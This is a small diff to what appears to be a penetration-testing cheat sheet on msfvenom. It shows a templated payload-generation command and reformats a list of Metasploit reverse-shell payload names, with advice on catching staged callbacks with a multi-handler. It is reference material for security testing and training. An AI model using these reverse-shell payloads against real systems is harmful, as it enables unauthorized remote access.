@@ -30,10 +30,10 @@ msfvenom -p <PAYLOAD> lhost=<IP> lport=<PORT> -f <FORMAT> -b <BAD_CHARS> -o <FIL
 > [!IMPORTANT]
 > You must use a multi-handler when catching staged payloads. If you want to use netcat you must use a stageless `linux/x86/shell_reverse_tcp`. Stageless payloads typicall have "shell" in their name.
 >
-> windows/shell/reverse_tcp (Staged)
-> windows/shell_reverse_tcp (Stageless)
-> linux/shell/reverse_tcp (Staged)
-> linux/shell_reverse_tcp (Stageless)
+> - windows/shell/reverse_tcp (Staged)
+> - windows/shell_reverse_tcp (Stageless)
+> - linux/shell/reverse_tcp (Staged)
+> - linux/shell_reverse_tcp (Stageless)
 
 ## Multi-handler
 Setup a multihander to catch a staged callback
